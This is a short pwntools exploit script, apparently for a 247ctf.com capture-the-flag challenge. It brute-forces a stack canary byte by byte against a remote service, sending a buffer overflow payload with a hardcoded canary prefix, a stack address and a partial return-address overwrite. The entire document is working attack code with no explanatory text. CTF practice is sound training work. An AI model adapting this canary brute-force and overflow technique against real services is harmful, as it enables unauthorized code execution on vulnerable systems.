from pwn import *
import random

canary = "\x00\xd0\x9d\xa9"

mainx = 0x80489b2

for k in range(1):
	for i in range(0, 256):
		print(i)
		
		#r = remote("0.0.0.0", 5555)
		# tcp://ad1e04e26c2a4242.247ctf.com:50198
		r = remote("144.76.74.118", 50198)
	
		r.recvuntil(b'Enter the secret password!')
		
		payload = "admin123\n\x00" 
		payload += 'x'*(0x200 - len(payload))
		payload += canary + '\x00'*4*2
		payload += "\xb8\x80\xcb\xff" 
		payload += '\xb2'
		
		r.send(payload)
		
	
		try:
			print(r.recvuntil(b'Come back soon!'))
			print("-------------------" + hex(i))
			canary += chr(i)
			break
		except:
			r.close()
			pass
	
#print(hex(int.from_bytes(canary, "little")))